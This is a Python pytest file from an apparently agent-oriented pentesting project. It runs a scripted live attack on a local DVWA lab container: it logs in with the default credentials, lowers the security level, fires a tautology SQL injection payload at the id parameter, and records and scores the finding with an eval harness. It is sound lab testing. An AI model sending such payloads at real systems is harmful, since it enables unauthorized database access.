"""A real live-target run: fire at an actual running DVWA container, record what
was found with the real record_finding tool, and score it with the eval
harness.

Requires DVWA's vulnerable instance already running locally, e.g.:
    docker compose -f docker-compose.dvwa.yml up -d

Marked ``live`` (this project's existing pytest marker convention, see
pyproject.toml) and skipped when nothing answers at the expected port -
matching test_eval_live_vampi.py's exact same convention, rather than
relying solely on a marker to be excluded from a default run. Its own
standing discipline is that a lab-target container is brought up only for a
live run and torn down immediately after, never left running between
sessions.

Mirrors test_eval_live_vampi.py's own scope exactly: this fires a small,
fully scripted sequence of real requests and calls record_finding directly,
not a full autonomous AgentLoop run - see that file's own docstring for why
an end-to-end LLM-driven live run is a separate, dedicated test
(test_eval_live_vampi_agent.py's own pattern).

DVWA, unlike VAmPI/Juice Shop, needs real session state before its
vulnerable pages are reachable at all: a one-time database setup, a login
(cookie-based session), and a security-level selection (its vulnerable
pages behave as "impossible" until set to "low"). All of that is scripted
here with plain requests through the SAME HttpFirer/httpx.Client instance
(whose cookie jar carries the session across calls) - no browser, no LLM.
The vulnerability exercised (classic SQL injection returning every row when
the ``id`` parameter is closed early) was confirmed against a real running
instance of this exact image before writing this test, not assumed from
DVWA's own documentation.
"""

from __future__ import annotations

import re
import socket
from urllib.parse import urlencode

import httpx
import pytest

from lalo.agent.tools import ToolRegistry
from lalo.eval.cases import BenchmarkCase, run_case
from lalo.eval.scoring import score_composite
from lalo.execution.firer import HttpFirer
from lalo.execution.scope import ScopeGuard
from lalo.execution.target import Engagement
from lalo.findings.tool import build_record_finding_tool
from lalo.graph.model import ReachabilityGraph

DVWA_HOST = "127.0.0.1"
DVWA_PORT = 8080
DVWA_URL = f"http://{DVWA_HOST}:{DVWA_PORT}"

_FORM_HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}


def _dvwa_reachable() -> bool:
    try:
        with socket.create_connection((DVWA_HOST, DVWA_PORT), timeout=0.5):
            return True
    except OSError:
        return False


def _csrf_token(html: str) -> str:
    match = re.search(r"user_token'\s*value='([a-f0-9]+)'", html)
    assert match is not None, "DVWA page did not contain the expected user_token field"
    return match.group(1)


_SQLI_CVSS = {
    "attack_vector": "N",
    "attack_complexity": "L",
    "privileges_required": "L",
    "user_interaction": "N",
    "scope": "U",
    "confidentiality": "H",
    "integrity": "N",
    "availability": "N",
}


@pytest.mark.live
@pytest.mark.skipif(not _dvwa_reachable(), reason="DVWA is not running on 127.0.0.1:8080")
def test_live_dvwa_sqli_returns_every_row_and_scores_as_a_true_positive() -> None:
    engagement = Engagement.from_specs(["127.0.0.1:8080"])
    scope = ScopeGuard(engagement=engagement)
    # A single shared httpx.Client (hence a single cookie jar) carries the
    # session across every call below - setup, login, and the security-level
    # change all depend on the SAME PHPSESSID the login response sets.
    firer = HttpFirer(scope, client=httpx.Client())

    setup_page = firer.fire("GET", f"{DVWA_URL}/setup.php")
    assert setup_page.fired is True
    firer.fire(
        "POST",
        f"{DVWA_URL}/setup.php",
        headers=_FORM_HEADERS,
        content=urlencode(
            {
                "create_db": "Create / Reset Database",
                "user_token": _csrf_token(setup_page.body.decode("utf-8")),
            }
        ).encode("utf-8"),
    )

    login_page = firer.fire("GET", f"{DVWA_URL}/login.php")
    assert login_page.fired is True
    login_result = firer.fire(
        "POST",
        f"{DVWA_URL}/login.php",
        headers=_FORM_HEADERS,
        content=urlencode(
            {
                "username": "admin",
                "password": "password",
                "user_token": _csrf_token(login_page.body.decode("utf-8")),
                "Login": "Login",
            }
        ).encode("utf-8"),
    )
    # A successful login redirects to index.php; a failed one redirects back
    # to login.php - the real, load-bearing check, not just "a 302 happened".
    assert login_result.headers.get("location") == "index.php"

    security_page = firer.fire("GET", f"{DVWA_URL}/security.php")
    assert security_page.fired is True
    firer.fire(
        "POST",
        f"{DVWA_URL}/security.php",
        headers=_FORM_HEADERS,
        content=urlencode(
            {
                "security": "low",
                "seclev_submit": "Submit",
                "user_token": _csrf_token(security_page.body.decode("utf-8")),
            }
        ).encode("utf-8"),
    )

    sqli_url = f"{DVWA_URL}/vulnerabilities/sqli/?"
    baseline = firer.fire("GET", sqli_url + urlencode({"id": "1", "Submit": "Submit"}))
    assert baseline.fired is True
    baseline_body = baseline.body.decode("utf-8")
    assert baseline_body.count("First name:") == 1  # a normal id=1 lookup returns exactly one row

    injected = firer.fire("GET", sqli_url + urlencode({"id": "1' OR '1'='1", "Submit": "Submit"}))
    assert injected.fired is True
    injected_body = injected.body.decode("utf-8")
    # The unmistakable proof: closing the string early and OR-ing a tautology
    # returns every row in the table, not just id=1's own row.
    assert injected_body.count("First name:") > 1

    graph = ReachabilityGraph()
    registry = ToolRegistry([build_record_finding_tool(graph)])
    record_result = registry.dispatch(
        "record_finding",
        {
            "title": "SQL injection in the id parameter of vulnerabilities/sqli/",
            "description": (
                "The id parameter is concatenated directly into the backing SQL "
                "query with no parameterization - closing the string early with "
                "\"1' OR '1'='1\" returns every row in the users table instead of "
                "just the requested id."
            ),
            "vuln_class": "sql-injection",
            "target": f"{DVWA_URL}/vulnerabilities/sqli/",
            "param": "id",
            "evidence": [baseline_body, injected_body],
            "evidence_excerpt": "First name:",
            "counterevidence": (
                f"A baseline id=1 request returns exactly one row "
                f"({baseline_body.count('First name:')}), confirming the extra "
                f"rows are the injection's own effect, not normal behavior."
            ),
            "severity_change_conditions": (
                "Confirming write access via a stacked query would raise severity."
            ),
            "remediation": "Use parameterized queries for the id lookup.",
            "cvss_breakdown": _SQLI_CVSS,
        },
    )
    assert record_result.ok is True

    case = BenchmarkCase(
        name="dvwa-live-smoke",
        description="A narrow live smoke case: one known DVWA primitive, not the full target.",
        ground_truth_classes=frozenset({"sql-injection"}),
    )
    case_result = run_case(case, graph)
    assert case_result.found_classes == frozenset({"sql-injection"})

    composite = score_composite([case_result])
    assert composite.mean_recall == 1.0
    assert composite.mean_precision == 1.0
    assert composite.case_count == 1
